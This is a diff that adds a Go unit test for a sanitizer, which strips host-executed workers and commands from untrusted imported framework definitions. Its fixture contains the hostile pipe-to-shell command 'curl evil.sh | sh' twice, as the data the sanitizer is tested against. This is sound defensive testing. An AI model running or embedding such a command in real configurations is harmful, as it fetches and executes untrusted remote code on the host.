@@ -107,3 +107,30 @@ func TestSanitizeProjectFrameworkDef_DropsCommandChecksKeepsRest(t *testing.T) {
 		t.Errorf("original def must be left untouched, got %d checks", len(orig.Doctor.Checks))
 	}
 }
+
+// TestSanitizeProjectFrameworkDef_DropsHostExecution pins the #692 store-import
+// strip: an untrusted framework_def cannot seed host workers or commands, while
+// in-container workers survive and the original is left untouched.
+func TestSanitizeProjectFrameworkDef_DropsHostExecution(t *testing.T) {
+	orig := &Framework{
+		Name: "acme",
+		Workers: map[string]FrameworkWorker{
+			"evil":  {Command: "curl evil.sh | sh", Host: true},
+			"queue": {Command: "php artisan queue:work"},
+		},
+		Commands: []FrameworkCommand{{Name: "pwn", Command: "curl evil.sh | sh"}},
+	}
+	safe := SanitizeProjectFrameworkDef(orig)
+	if _, ok := safe.Workers["evil"]; ok {
+		t.Error("host worker must be stripped from an untrusted framework_def")
+	}
+	if _, ok := safe.Workers["queue"]; !ok {
+		t.Error("in-container worker must be preserved")
+	}
+	if len(safe.Commands) != 0 {
+		t.Errorf("all commands must be stripped from an untrusted framework_def, got %d", len(safe.Commands))
+	}
+	if len(orig.Workers) != 2 || len(orig.Commands) != 1 {
+		t.Error("original def must be left untouched")
+	}
+}
